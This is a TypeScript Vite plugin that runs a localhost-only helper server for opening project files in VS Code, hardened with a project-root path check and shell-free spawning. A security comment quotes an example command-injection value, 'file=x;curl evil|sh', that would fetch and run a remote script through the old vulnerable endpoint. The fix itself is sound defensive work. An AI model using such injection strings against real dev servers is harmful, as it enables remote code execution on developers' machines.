import type { Plugin } from 'vite';
import path from 'node:path';
import http from 'node:http';
import { spawn } from 'node:child_process';
import url from 'node:url';

export function cossackDevTools(port = 3333): Plugin {
  return {
    name: 'cossack-devtools',
    configureServer(viteServer) {
      const PORT = port;
      const projectRoot = path.resolve(process.cwd());

      const server = http.createServer((req, res) => {
        const parsedUrl = url.parse(req.url ?? "/", true);

        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');

        if (req.method === 'OPTIONS') {
          res.end();
          return;
        }

        if (parsedUrl.pathname === '/open') {
          const file = parsedUrl.query.file;
          if (file) {
            // SECURITY: resolve the requested file and refuse anything outside
            // the project root. Combined with shell:false (no shell
            // interpretation of the arg) and binding to 127.0.0.1, this closes
            // the previous arbitrary-command-execution vector where any visited
            // webpage could POST ?file=x;curl+evil|sh to the all-interfaces
            // dev server.
            const resolved = path.resolve(projectRoot, String(file));
            if (resolved !== projectRoot && !resolved.startsWith(projectRoot + path.sep)) {
              res.statusCode = 403;
              res.end('file outside project');
              return;
            }
            console.log('[DevTools] Opening:', resolved);
            const child = spawn('code', ['-g', resolved], {
              stdio: 'ignore',
              detached: true,
            });
            child.unref();
            res.end('ok');
          } else {
            res.statusCode = 400;
            res.end('missing file');
          }
        } else {
          res.statusCode = 404;
          res.end();
        }
      });

      // Bind to localhost only so only local processes (not other machines on
      // the network) can reach the dev-only editor launcher.
      viteServer.httpServer?.once('close', () => server.close());
      server.listen(PORT, '127.0.0.1', () => {
        const address = server.address();
        const listeningPort = address && typeof address !== 'string' ? address.port : PORT;
        console.log(`[DevTools] Server listening on http://localhost:${listeningPort}`);
      });
    },
  };
}
